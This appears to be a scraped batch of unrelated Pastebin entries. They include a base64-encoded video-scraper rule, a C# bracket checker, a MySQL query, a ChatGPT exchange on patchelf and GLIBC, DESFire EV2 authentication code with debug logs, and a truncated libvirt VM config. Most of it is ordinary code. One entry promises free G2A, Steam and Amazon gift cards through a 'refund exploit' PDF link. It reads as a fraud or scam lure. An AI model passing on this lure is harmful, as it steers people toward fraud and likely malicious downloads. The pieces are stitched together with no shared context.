JlbWFyayYmVGV4dCcpLFxcbiAgICAgICAgcGljX3VybDogcGQobGlzdFtqXSwgJ2ltZyYmc3JjJykgKyAnQFJlZmVyZXI9JyxcXG4gICAgICAgIGNvbF90eXBlOiAnbW92aWVfMicsXFxuICAgICAgICB1cmw6IHBkKGxpc3Rbal0sICdhJiZocmVmJykucmVwbGFjZShcXFwidm9kXFxcIixcXFwiZHBsYXllci9pbmRleFxcXCIpICsgIFxcXCJAbGF6eVJ1bGU9LmpzOnJlcXVlc3QoaW5wdXQpLm1hdGNoKC91cmw6XFxcXCAnKGh0dHAuKj9tM3U4KVxcXFwnLylbMV1cXFwiXFxuICAgIH0pXFxufVxcbnNldFJlc3VsdChkKTtcIn1dLFwic2F2ZWRcIjpmYWxzZSxcInRpdGxlXCI6XCLmnY/oirHlnYpcIixcInZlcnNpb25cIjowLFwidXJsXCI6XCJoaWtlcjovL2VtcHR5IyNodHRwczovLzRjNzYueGluZ2h1YWZhbmczOC54eXovdm9kX2xpc3QucGhwP3M9JnA9NCZmPSZ2PSZzb3J0PW5ldyZwYWdlPWZ5cGFnZVwiLFwiY29sX3R5cGVcIjpcImNhcmRfcGljXzNfY2VudGVyXCIsXCJmaW5kX3J1bGVcIjpcImpzOiQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL3lpamlcXFwiKVwiLFwiZ3JvdXBcIjpcIuKRqeeni+WQjeWxsVwiLFwidWFcIjpcImF1dG9cIixcInByZVJ1bGVcIjpcIi8v5rC45LmF5Zyw5Z2AICAgICBodHRwczovL3hoZjMudmlwL1xcblxcbmxldCB0aW1lID0gbmV3IERhdGUoKS5nZXREYXRlKCkudG9TdHJpbmcoKTtcXG5pZiAoZ2V0SXRlbSgndGltZScsIG5ldyBEYXRlKCkuZ2V0RGF0ZSgpLnRvU3RyaW5nKCkpICE9IHRpbWUgfHwgIWdldEl0ZW0oJ2xpbmsnLCAnJykuaW5jbHVkZXMoJ2h0dHAnKSkge1xcbiAgICBsZXQgZmFidSA9IFxcXCJodHRwczovL3hoZjMudmlwL1xcXCJcXG4gICAgbGV0IHRpcHMgPSBwZGZhKGZldGNoKGZhYnUpLFxcXCJ1bCYmbGk6aGFzKGEpXFxcIikubWFwKGl0ZW09PnBkZmgoaXRlbSxcXFwiYSYmaHJlZlxcXCIpKVxcbiAgICB1cmwgPSB0aXBzW01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIHRpcHMubGVuZ3RoKV1cXG4gICAgbGV0IGxpbmsgPSB1cmxcXG4gICAgc2V0SXRlbSgndGltZScsIHRpbWUpO1xcbiAgICBzZXRJdGVtKCdsaW5rJywgbGluayk7XFxuICAgIC8vdG9hc3QoJ+abtOaWsOWfn+WQjScpO1xcbiAgICBsb2coXFxcIuacgOaWsOWcsOWdgDpcXFwiK2xpbmspXFxuICAgIGNvbmZpcm0oe1xcbiAgICAgICAgdGl0bGU6J+adj+iKseWdiicsIFxcbiAgICAgICAgY29udGVudDon5bey5pu05paw572R5Z2A5Li6XFxcXG4nK2xpbmssIFxcbiAgICAgICAgY29uZmlybTokLnRvU3RyaW5nKCgpPT57fSksIFxcbiAgICAgICAgY2FuY2VsOiQudG9TdHJpbmcoKCk9Pnt9KVxcbiAgICB9KVxcbn1cXG5cXG5pbml0Q29uZmlnKHtcXG4gICAgaG9zdDogZ2V0SXRlbSgnbGluaycsICdodHRwczovLzc2OTMueGluZ2h1YWZhbmcyMS54eXonKVxcbn0pO1wiLFwicGFnZXNcIjpcIlt7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLliqjmgIFcXFwiLFxcXCJwYXRoXFxcIjpcXFwiZHRcXFwiLFxcXCJydWxlXFxcIjpcXFwiXFxcXG5cXFxcbmNvbnN0IGVtcHR5ID0gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCJcXFxcblxcXFxudHJ5IHtcXFxcbiAgICB2YXIgY2F0ZWdvcmllcyA9IHBkZmEoaHRtbCwg5aSn57G75a6a5L2NKS5jb25jYXQocGRmYShodG1sLCDmi7zmjqXliIbnsbspKVxcXFxufSBjYXRjaCAoZSkge1xcXFxuICAgIHZhciBjYXRlZ29yaWVzID0gcGRmYShodG1sLCDlpKfnsbvlrprkvY0pXFxcXG59XFxcXG5cXFxcbmxldCBpbml0X2NhdGUgPSBbXVxcXFxuXFxcXG5mb3IgKGxldCBpID0gMDsgaSA8IDIwOyBpKyspIHtcXFxcbiAgICBpbml0X2NhdGUucHVzaChcXFxcXFxcIjBcXFxcXFxcIilcXFxcbn1cXFxcblxcXFxuY29uc3QgZm9sZCA9IGdldFZhcihNWV9SVUxFLmdyb3VwLCBcXFxcXFxcIjBcXFxcXFxcIilcXFxcbmNvbnN0IGNhdGVfdGVtcF9qc29uID0gZ2V0VmFyKE1ZX1JVTEUudGl0bGUsIEpTT04uc3RyaW5naWZ5KGluaXRfY2F0ZSkpXFxcXG5jb25zdCBjYXRlX3RlbXAgPSBKU09OLnBhcnNlKGNhdGVfdGVtcF9qc29uKVxcXFxuXFxcXG5pZiAocGFyc2VJbnQocGFnZSkgPT09IDEpIHtcXFxcblxcXFxuXFxcXG5cXFxcbmNhdGVnb3JpZXMuZm9yRWFjaCgoY2F0ZWdvcnksIGluZGV4KSA9PiB7XFxcXG4gICAgICAgIGxldCBzdWJfY2F0ZWdvcmllcyA9IHBkZmEoY2F0ZWdvcnksIOWwj+exu+WumuS9jSk7ICAgXFxcXG4gICAgICAgICAgICBzdWJfY2F0ZWdvcmllcy5mb3JFYWNoKChpdGVtLCBrZXkpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgdGl0bGUgPSBwZGZoKGl0ZW0sIOWIhuexu+agh+mimClcXFxcbiAgICAgICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZToga2V5LnRvU3RyaW5nKCkgPT09IGNhdGVfdGVtcFtpbmRleF0gPyAn4oCc4oCc4oCd4oCdPGI+PHNwYW4gc3R5bGU9XFxcXFxcXCJjb2xvcjogJyArIOWIhuexu+minOiJsiArICdcXFxcXFxcIj4nICsgdGl0bGUgKyAnPC9zcGFuPjwvYj4nIDogdGl0bGUsXFxcXG4gICAgICAgICAgICAgICAgICAgIHVybDogJChwZChpdGVtLCDliIbnsbvpk77mjqUpICsgJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHBhcmFtcykgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcGFyYW1zLmNhdGVfdGVtcFtwYXJhbXMuaW5kZXhdID0gcGFyYW1zLmtleS50b1N0cmluZygpXFxcXG5cXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHB1dFZhcihNWV9SVUxFLnRpdGxlLCBKU09OLnN0cmluZ2lmeShwYXJhbXMuY2F0ZV90ZW1wKSlcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIHB1dFZhcihNWV9SVUxFLnVybCwgaW5wdXQpXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSh0cnVlKVxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiXFxcXG4gICAgICAgICAgICAgICAgICAgIH0sIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhdGVfdGVtcDogY2F0ZV90ZW1wLFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgaW5kZXg6IGluZGV4LFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAga2V5OiBrZXksXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICBwYWdlOiBwYWdlLFxcXFxuICAgICAgICAgICAgICAgICAgICB9KSxcXFxcbiAgICAgICAgICAgICAgICAgICAgY29sX3R5cGU6ICdmbGV4X2J1dHRvbicsXFxcXG4gICAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcImJsYW5rX2Jsb2NrXFxcXFxcXCJcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgIH0pXFxcXG59XFxcXG5cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLkuIDnuqdcXFwiLFxcXCJwYXRoXFxcIjpcXFwieWlqaVxcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbnZhciBkID0gW107XFxcXG5cXFxcbmNvbnN0IOWIhuexu+minOiJsiA9ICcjZmY2ODc3J1xcXFxuY29uc3Qg5aSn57G75a6a5L2NID0gJyNsZW8tc2VsZWN0LTImJnVsJ1xcXFxuY29uc3Qg5ou85o6l5YiG57G7ID0gJydcXFxcbmNvbnN0IOWwj+exu+WumuS9jSA9ICdib2R5JiZhOm5vdCg6bWF0Y2hlcyjpppbpobV85LqS5o2ifOWIhuexu3zlubPlj7ApKSdcXFxcbmNvbnN0IOWIhuexu+agh+mimCA9ICdhJiZUZXh0J1xcXFxuY29uc3Qg5YiG57G76ZO+5o6lID0gJ2EmJmhyZWYnXFxcXG5NWV9VUkwgPSBNWV9VUkwucmVwbGFjZSgnaGlrZXI6Ly9lbXB0eSMjJywgJycpXFxcXG5cXFxcbmxldCB0cnVlX3VybCA9IGdldFZhcihNWV9SVUxFLnVybCwgTVlfVVJMKVxcXFxuY29uc3QgcGFnZSA9IE1ZX1BBR0VcXFxcblxcXFxuaWYgKGdldFZhcihNWV9SVUxFLnVybCkpIHtcXFxcbiAgICBpZiAoL1xcXFxcXFxcP3A9Ly50ZXN0KHRydWVfdXJsKSl7XFxcXG50cnVlX3VybD10cnVlX3VybC5yZXBsYWNlKFxcXFxcXFwiXFxcXFxcXFw/cD1cXFxcXFxcIixcXFxcXFxcIlxcXFxcXFxcP3M9JnA9XFxcXFxcXCIpKycmZj0xJnY9JnNvcnQ9bmV3JnBhZ2U9JyArIHBhZ2VcXFxcbiAgICB9ZWxzZXtcXFxcbnRydWVfdXJsPXRydWVfdXJsKycmcGFnZT0nICtwYWdlXFxcXG4gICAgfVxcXFxufVxcXFxuXFxcXG52YXIgaHRtbCA9IHJlcXVlc3QodHJ1ZV91cmwpXFxcXG5ldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL2R0JykpLnJ1bGUpXFxcXG4vL2V2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbGF6eScpKS5ydWxlKVxcXFxuXFxcXG52YXIgbGlzdCA9IHBkZmEoaHRtbCwgJ2JvZHkmJi5sZW8tdmlkZW8taXRlbXx8Lmxlby12aWRlby1yaXRlbScpO1xcXFxuZm9yICh2YXIgaiBpbiBsaXN0KSB7XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IHBkZmgobGlzdFtqXSwgJ2EmJnRpdGxlJyksXFxcXG4gICAgICAgIGRlc2M6IHBkZmgoaHRtbCwgJy5sZW8tdmlkZW8tcmVtYXJrJiZUZXh0JyksXFxcXG4gICAgICAgIHBpY191cmw6IHBkKGxpc3Rbal0sICdpbWcmJnNyYycpICsgJ0BSZWZlcmVyPScsXFxcXG4gICAgICAgIGNvbF90eXBlOiAnbW92aWVfMicsXFxcXG4gICAgICAgIHVybDogcGQobGlzdFtqXSwgJ2EmJmhyZWYnKS5yZXBsYWNlKFxcXFxcXFwidm9kXFxcXFxcXCIsXFxcXFxcXCJkcGxheWVyL2luZGV4XFxcXFxcXCIpICsgIFxcXFxcXFwiQGxhenlSdWxlPS5qczpyZXF1ZXN0KGlucHV0KS5tYXRjaCgvdXJsOlxcXFxcXFxcICcoaHR0cC4qP20zdTgpXFxcXFxcXFwnLylbMV1cXFxcXFxcIlxcXFxuICAgIH0pXFxcXG59XFxcXG5zZXRSZXN1bHQoZCk7XFxcIn1dXCJ9IiwicGljVXJsIjoiaHR0cHM6Ly80Yzc2LnhpbmdodWFmYW5nMzgueHl6L2ltYWdlcy9waW5ndGFpL2ppYW5qaWFvLmpwZyIsInRpdGxlIjoi5bCW5Y+rIn0=
qnNsb4cV,ДЗ: Скобочное выражение,TeT91,C#,Thursday 16th of May 2024 04:02:33 AM CDT,"using System;

namespace CSLight
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string brakets = ""()"";
            char openedBraket = '(';
            char closedBraket = ')';

            int maxDeep = 0;
            int currentDeep = 0;

            int half = 2;

            if (brakets.Length % half == 0)
            {
                for (int i = 0; i < brakets.Length; i++)
                {
                    if (brakets[i] == openedBraket)
                    {
                        currentDeep++;
                        if (currentDeep > maxDeep)
                        {
                            maxDeep = currentDeep;
                        }
                    }
                    else if (brakets[i] == closedBraket)
                    {
                        currentDeep--;

                        if(currentDeep < 0)
                        {
                            break;
                        }
                    }
                }

                if (currentDeep != 0)
                {
                    Console.WriteLine(""Строка не корректна"");
                }
                else
                {
                    Console.WriteLine($""Строка корректна. Глубина {maxDeep}"");
                }
            }
            else
            {
                Console.WriteLine(""Строка не корректна"");
            }

            Console.ReadKey();
        }
    }
}"
eCgSEZcr,Untitled,luthfy13,MySQL,Thursday 16th of May 2024 03:58:37 AM CDT,"SELECT
	vwPindahHbInternal.*,
	trx_surat_pindah_hb_internal.*,
	mst_perihal_surat.perihal_surat 
FROM
	trx_surat_pindah_hb_internal
	INNER JOIN trx_surat ON trx_surat_pindah_hb_internal.no_surat = trx_surat.no_surat
	INNER JOIN mst_perihal_surat ON trx_surat.id_perihal = mst_perihal_surat.id_perihal
	INNER JOIN vwPindahHbInternal ON vwPindahHbInternal.id_permintaan = trx_surat_pindah_hb_internal.id_permintaan 
WHERE
	vwPindahHbInternal.sts_permintaan = '6' 
	AND vwPindahHbInternal.id_profil = '222033' 
	AND getIdUnitSurat ( trx_surat.no_surat ) = id_fakultas"
0N9r2x8v,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Thursday 16th of May 2024 03:52:56 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_452033.pdf

Working as of:
16 May 2024"
bacrERrX,run linux program made for lower GLIBC than mine,plirof2,JavaScript,Thursday 16th of May 2024 03:44:02 AM CDT,"
==========================
linux how can I have multiple versions of GLIBC in my system? Without docker and without compiling . So I can use them with patchelf interpreter parameter? 

One way to have multiple versions of GLIBC on your system without using Docker or compiling is to use a chroot environment. A chroot environment allows you to run a separate instance of the Linux operating system within your existing system. 

Here's a general outline of how you can set up a chroot environment with multiple versions of GLIBC:

1. Download and install the necessary version of GLIBC in a separate directory within your system (e.g. /opt/glibc-2.x).
2. Create a chroot environment using the chroot command, specifying the directory where you installed GLIBC as the root directory.
3. Within the chroot environment, you can use the patchelf command with the interpreter parameter to execute programs compiled against the specific version of GLIBC that you installed.

Keep in mind that setting up and maintaining a chroot environment can be complex and may require some trial and error. Additionally, using a chroot environment may not be suitable for all use cases, so make sure to carefully consider whether this approach is appropriate for your specific needs.

==============================================

Εσείς
In linux how can I run a program written for higher GLIBC than mine? Without making changes on my system? and without docker


ChatGPT
Αντιγραφή
One way to run a program that requires a higher version of GLIBC than the one installed on your system is by using a tool called ""patchelf."" Patchelf is a small utility that can modify the dynamic linker and RPATH of an executable, allowing it to use a different version of the GLIBC library.

Here's how you can use patchelf to run a program with a higher version of GLIBC:

Download and install patchelf on your system. You can usually find it in your distribution's package repository or download it from the official website.

Find the executable file of the program that requires a higher version of GLIBC.

Use the following command to modify the RPATH of the executable to point to a directory where the higher version of GLIBC is installed:

 
patchelf --set-interpreter /path/to/higher_version_glibc/ld-linux-x86-64.so.2 --set-rpath /path/to/higher_version_glibc/lib:/path/to/higher_version_glibc/lib64 your_program_executable
Replace ""/path/to/higher_version_glibc"" with the actual path to the directory where the higher version of GLIBC is installed, and ""your_program_executable"" with the name of the program executable file.

Now run the modified program using the following command:
 
./your_program_executable
This should allow the program to run using the higher version of GLIBC without making changes to your system or using Docker. Keep in mind that this method may not work for all programs, as some may have additional dependencies that need to be resolved.


=============================================
Εσείς
In linux how can I run a program written for lower GLIBC than mine? Without making changes on my system?


ChatGPT
Αντιγραφή
One way to run a program written for a lower GLIBC version than the one on your system is to use a tool called patchelf. This tool allows you to modify the dynamic linker and interpreter path in the ELF binary, allowing it to run on a system with a different GLIBC version.

Here's how you can use patchelf to run a program with a lower GLIBC version:

First, install patchelf if you don't already have it on your system. You can install it using your package manager (e.g., sudo apt-get install patchelf on Debian-based systems).
Use the following command to change the interpreter path in the ELF binary:
 
patchelf --set-interpreter /path/to/older/glibc/ld-linux.so.2 /path/to/your/program
Replace /path/to/older/glibc/ld-linux.so.2 with the path to the older version of the ld-linux.so.2 file on your system, and replace /path/to/your/program with the path to the program you want to run.

Run the program using the modified ELF binary:
 
./path/to/your/program
This method will allow you to run a program with a lower GLIBC version on your system without making any changes to your system-wide libraries."
6AUbvejj,Output,Amrin12,Bash,Thursday 16th of May 2024 03:43:51 AM CDT,"'EV2 First RandB Enc: ', 'FD99A2DA41CEED1422CBB278FFC3D6CB'
'Auth EV2 First RandB: ', 'afd6fe94d98f6825b13b6b18266979d8'
'Auth EV2 First RandB Rotate: ', 'd6fe94d98f6825b13b6b18266979d8af'
'Auth EV2 First RandA: ', '12cbc827037361ca719fc00108e0f134'
input bytes: AFA489D8BEE3FF2A4097F8C60A1C84A6BAD6286A2A7356E2EAAE9352058F74579E
Operation Success
'First part response: ', { status: 0,
  data: '3BE204D70DCE33584FFCD9F9502622C3778B52B0DFF8C8647C553F3238051BF9' }
'Data received: ', '80db5387cbc827037361ca719fc00108e0f13412000000000000c00000000000'
'TI: ', '80db5387'
'RandA: ', 'cbc827037361ca719fc00108e0f13412'
'PCDcap: ', '000000000000c00000000000'
Auth successful!
'RandA Bytes: ', { '0': 18,
  '1': 203,
  '2': 200,
  '3': 39,
  '4': 3,
  '5': 115,
  '6': 97,
  '7': 202,
  '8': 113,
  '9': 159,
  '10': 192,
  '11': 1,
  '12': 8,
  '13': 224,
  '14': 241,
  '15': 52 }
'RandB Bytes: ', { '0': 175,
  '1': 214,
  '2': 254,
  '3': 148,
  '4': 217,
  '5': 143,
  '6': 104,
  '7': 37,
  '8': 177,
  '9': 59,
  '10': 107,
  '11': 24,
  '12': 38,
  '13': 105,
  '14': 121,
  '15': 216 }
'RandA_15_14:', { '0': 18, '1': 203 }
'RandA_13_8:', { '0': 200, '1': 39, '2': 3, '3': 115, '4': 97, '5': 202 }
'RandB_15_10:', { '0': 175, '1': 214, '2': 254, '3': 148, '4': 217, '5': 143 }
'RandB_9_0:', { '0': 104,
  '1': 37,
  '2': 177,
  '3': 59,
  '4': 107,
  '5': 24,
  '6': 38,
  '7': 105,
  '8': 121,
  '9': 216 }
'RandA_7_0:', { '0': 113,
  '1': 159,
  '2': 192,
  '3': 1,
  '4': 8,
  '5': 224,
  '6': 241,
  '7': 52 }
'XORed Value: ', '67f1fde7b845'
'XORed Bytes: ', [ 103, 241, 253, 231, 184, 69 ]
'SV1: ', [ 165,
  90,
  0,
  1,
  0,
  128,
  18,
  203,
  103,
  241,
  253,
  231,
  184,
  69,
  104,
  37,
  177,
  59,
  107,
  24,
  38,
  105,
  121,
  216,
  113,
  159,
  192,
  1,
  8,
  224,
  241,
  52 ]
'SV2: ', [ 90,
  165,
  0,
  1,
  0,
  128,
  18,
  203,
  103,
  241,
  253,
  231,
  184,
  69,
  104,
  37,
  177,
  59,
  107,
  24,
  38,
  105,
  121,
  216,
  113,
  159,
  192,
  1,
  8,
  224,
  241,
  52 ]
'session_key_enc_string: ', 'a55a0001008012cb67f1fde7b8456825b13b6b18266979d8719fc00108e0f134'
'session_key_mac_string: ', '5aa50001008012cb67f1fde7b8456825b13b6b18266979d8719fc00108e0f134'

'KSessionAuthENC: ', '0a7f2e5a01f35ec8378de5d5a40ca71a'
'KSessionAuthMAC: ', '6743b9af880a8ddc150053eb4b342366'
---------------------------------------------------------------------
Get Card Version
Getting MAC Input
'CMD Counter: ', 0
'Transaction ID: ', '80db5387'
'Command Counter: ', [ 0 ]
'transactionId: ', [ 128, 219, 83, 135 ]
'Mac Input: ', '600080DB5387'
'Encrypted zero: ', '7fcbd3fa506ac6599c419d1e586402b5'
ff 97 a7 f4 a0 d5 8c b3 38 83 3a 3c b0 c8 05 6a
'Subkey 1: ', 'FF97A7F4A0D58CB338833A3CB0C8056A'
'Subkey 2: ', 'FF2F4FE941AB19667106747961900A53'
'Mac Full: ', 'c61be8e5b0215b7275b622664440664c'
'Truncated MAC: ', '1be52172b666404c'
'MAC Truncated: ', '1be52172b666404c'
input bytes: 601BE52172B666404C
Integrity Error
'Get Card Version: ', { status: 30, data: '' }"
pjhpwV2j,Functions that relates to mac,Amrin12,JavaScript,Thursday 16th of May 2024 03:38:34 AM CDT,"/**
     * 
     * @param {number[]} cmd 
     * @param {number[]} options 
     * @returns {number[]}
     */
getMacInput = (cmd, options) => {
    console.log(""Getting MAC Input"");

    console.log(""CMD Counter: "", this.CmdCounter);
    console.log(""Transaction ID: "", this.TransactionIdentifier);

    // get cmdCounter
    const commandCounter = DesfireUtils.intToHexArray(this.CmdCounter, 1);

    console.log(""Command Counter: "", commandCounter);
    const transactionId = DesfireUtils.hexStringToByte(this.TransactionIdentifier);
    console.log(""transactionId: "", transactionId);

    let macInput = cmd.concat(commandCounter).concat(transactionId);

    if (options != null) 
        macInput = macInput.concat(options);

    return macInput;
}
   
getCardVersion = async () => {
    let cmd = DESFIRE_INS.GET_UID;

    const macInput = this.getMacInput(cmd, null);
    const macInputString = DesfireUtils.getHexFromDecArray(macInput);
    console.log(""Mac Input: "", macInputString);

    const macFull = CMAC.calculateCmac(this.sessionAuthMac, macInputString);
    console.log(""Mac Full: "", macFull);

    const macTruncated = CMAC.macTruncate(macFull);
    console.log(""MAC Truncated: "", macTruncated);

    const param = DesfireUtils.hexStringToByte(macTruncated);
    cmd = cmd.concat(param);

    let response = await this.sendCommand(cmd);
    console.log(""Get Card Version: "", response)

}

CMAC::macTruncate = (message) => {
    const fullMAC = this.hexStringToByte(message);
    const fullMACLength = fullMAC.length;

    const truncatedMAC = new Uint8Array(fullMACLength / 2);
    let truncatedMACPos = 0;
    for (let i = 1; i < fullMACLength; i += 2) {
        truncatedMAC[truncatedMACPos] = fullMAC[i];
        truncatedMACPos++;
    }

    const truncatedMACString = Array.from(truncatedMAC).map(byte => {
        // Convert each byte to its hexadecimal representation
        return ('0' + byte.toString(16)).slice(-2); // Ensure two characters for each byte
    }).join('');

    console.log('Truncated MAC: ', truncatedMACString);
    return truncatedMACString;
}"
uTc5pgrd,authenticateEV2First,Amrin12,JavaScript,Thursday 16th of May 2024 03:33:13 AM CDT,"/**
     * 
     * @param {Number} keyNo 
     * @param {String} key 
     * @returns 
     */
    authenticateEV2First = async (keyNo, key) => {
        let cmd = DESFIRE_INS.AUTH_EV2_FIRST;
        let _keyNo = DesfireUtils.intToHexArray(keyNo, 1);
        let auth_key = key;
        let _lenCap = [0x02];
        let _pcdCap = [0xC0, 0x00];

        cmd = cmd.concat(_keyNo).concat(_lenCap).concat(_pcdCap);
        let response = await this.sendCommand(cmd);
        
        let randB_enc = response.data;
        console.log(""Auth EV2 First RandB Enc: "", randB_enc);

        let randB = DesfireUtils.aesDecryptor(randB_enc, auth_key);
        console.log(""Auth EV2 First RandB: "", randB);

        let randB_rotate = await DesfireUtils.rotateLeft(randB);
        console.log(""Auth EV2 First RandB Rotate: "", randB_rotate);

        // Generate random 16-byte RndA
        const randA = CryptoJS.lib.WordArray.random(16).toString(CryptoJS.enc.Hex);
        console.log(""Auth EV2 First RandA: "", randA);

        let randAB = randA.concat(randB_rotate);

        let iv = CryptoJS.enc.Hex.parse(randB_enc);
        let randAB_enc = DesfireUtils.aesEncryptor(randAB, auth_key, iv);

        dataToSend = randAB_enc;

        let instructionByte = ""AF"";
        let cmdString = instructionByte.concat(dataToSend).toUpperCase();

        let byteArray = cmdString.match(/.{1,2}/g).map(hex => parseInt(hex, 16));
        cmd = byteArray;

        response = await this.sendCommand(cmd);
        console.log(""First part response: "", response);

        const status = response.status;

        if (status != DESFIRE_STATUS.SUCCESS) {
            console.log(status);
            console.log(""RandB' is wrong!\n"");
            return false;
        }

        let data_enc = response.data;
        
        iv = CryptoJS.enc.Hex.parse(dataToSend.slice(-32));

        // decrypt response
        // response contains TI (4 bytes) + randA' (16 bytes) + PDcap related (12 bytes)
        let data = DesfireUtils.aesDecryptor(data_enc, auth_key, iv);
        console.log(""Data received: "", data);

        let ti = data.slice(0, 8);
        let newRandA = data.slice(8, 40);
        let pcdcap_returned = data.slice(40);

        console.log(""TI: "", ti);
        console.log(""RandA: "", newRandA);
        console.log(""PCDcap: "", pcdcap_returned);

        // rotate right
        let newRandA_rotate = DesfireUtils.rotateRight(newRandA);

        if (newRandA_rotate.toUpperCase() !== randA.toUpperCase()) {
            console.log(""RandA' is not identical to original RandA. Authentication failed!\n"");
            return false;
        }

        console.log(""Auth successful!"");

        // generate AuthSessionKeys
        const session_label_enc = [0xA5, 0x5A];
        const session_label_mac = [0x5A, 0xA5];
        const session_counter = [0x00, 0x01];
        const session_length = [0x00, 0x80];
        const session_context = new Uint8Array(26);

        // xor some values in randA and randB
        // create SessionKey
        const randABytes = DesfireUtils.hexStringToByteArray(randA);
        const randBBytes = DesfireUtils.hexStringToByteArray(randB);

        console.log(""RandA Bytes: "", randABytes);
        console.log(""RandB Bytes: "", randBBytes);

        const randA_15_14 = randABytes.slice(0, 2);
        const randA_13_8 = randABytes.slice(2, 8);
        const randB_15_10 = randBBytes.slice(0, 6);
        const randB_9_0 = randBBytes.slice(6, 16);
        const randA_7_0 = randABytes.slice(8, 16);

        console.log(""RandA_15_14:"", randA_15_14);
        console.log(""RandA_13_8:"", randA_13_8);
        console.log(""RandB_15_10:"", randB_15_10);
        console.log(""RandB_9_0:"", randB_9_0);
        console.log(""RandA_7_0:"", randA_7_0);

        const randA_13_8_string = DesfireUtils.getHexFromDecArray(Array.from(randA_13_8));
        const randB_15_10_string = DesfireUtils.getHexFromDecArray(Array.from(randB_15_10));
        const xoredValues = DesfireUtils.xorHexStrings(randA_13_8_string, randB_15_10_string);
        
        const xored_bytes = DesfireUtils.hexStringToByte(xoredValues);

        console.log(""XORed Value: "", xoredValues);
        console.log(""XORed Bytes: "", xored_bytes);
 
        session_context.set(randA_15_14, 0);
        session_context.set(xored_bytes, 2);
        session_context.set(randB_9_0, 8);
        session_context.set(randA_7_0, 18);

        const session_context_array = Array.from(session_context);

        const sv1 = session_label_enc.concat(session_counter).concat(session_length).concat(session_context_array);
        const sv2 = session_label_mac.concat(session_counter).concat(session_length).concat(session_context_array);

        const session_key_enc_string = Array.from(sv1).map(byte => {
            // Convert each byte to its hexadecimal representation
            return ('0' + byte.toString(16)).slice(-2); // Ensure two characters for each byte
        }).join('');

        const session_key_mac_string = Array.from(sv2).map(byte => {
            // Convert each byte to its hexadecimal representation
            return ('0' + byte.toString(16)).slice(-2); // Ensure two characters for each byte
        }).join('');

        console.log(""SV1: "", sv1);
        console.log(""SV2: "", sv2);

        console.log(""session_key_enc_string: "", session_key_enc_string)
        console.log(""session_key_mac_string: "", session_key_mac_string)

        const sessionAuthMac = CMAC.calculateCmac(key, session_key_mac_string);
        const sessionAuthEnc = CMAC.calculateCmac(key, session_key_enc_string);

        this.sessionAuthMac = sessionAuthMac;
        this.sessionAuthEnc = sessionAuthEnc;
        this.CmdCounter = 0;
        this.TransactionIdentifier = ti;
        this.authenticateEV2FirstSucess = true;

        console.log(""\n"");
        return true;
    }"
LSikxy5M,windows11-ryzen5800x-libvirt-xml-14,mmcze,XML,Thursday 16th of May 2024 03:10:10 AM CDT,"<domain type='kvm' xmlns:qemu='http://libvirt.org/schemas/domain/qemu/1.0'>
  <name>windows2</name>
  <uuid>3ca72322-a343-32ff-ab2d-119eb4b63e34</uuid>
  <memory unit='KiB'>25165824</memory>
  <currentMemory unit='KiB'>25165824</currentMemory>
  <memoryBacking>
    <hugepages/>
    <nosharepages/>
    <locked/>
  </memoryBacking>
  <vcpu placement='static'>14</vcpu>
  <iothreads>1</iothreads>
  <cputune>
    <vcpupin vcpu='0' cpuset='15'/>
    <vcpupin vcpu='1' cpuset='7'/>
    <vcpupin vcpu='2' cpuset='14'/>
    <vcpupin vcpu='3' cpuset='6'/>
    <vcpupin vcpu='4' cpuset='13'/>
    <vcpupin vcpu='5' cpuset='5'/>
    <vcpupin vcpu='6' cpuset='12'/>
    <vcpupin vcpu='7' cpuset='4'/>
    <vcpupin vcpu='8' cpuset='11'/>
    <vcpupin vcpu='9' cpuset='3'/>
    <vcpupin vcpu='10' cpuset='10'/>
    <vcpupin vcpu='11' cpuset='2'/>
    <vcpupin vcpu='12' cpuset='9'/>
    <vcpupin vcpu='13' cpuset='1'/>
    <emulatorpin cpuset='8'/>
    <iothreadpin iothread='1' cpuset='0'/>
    <emulatorsched scheduler='fifo' priority='10'/>
  </cputune>
  <resource>
    <partition>/machine</partition>
  </resource>
  <os>
    <type arch='x86_64' machine='pc-q35-7.0'>hvm</type>
    <loader readonly='yes' secure='yes' type='pflash'>/usr/share/OVMF/OVMF_CODE_4M.secboot.fd</loader>
    <nvram>/usr/share/OVMF/OVMF_VARS_4M.ms.fd</nvram>
    <bootmenu enable='no'/>
    <smbios mode='host'/>
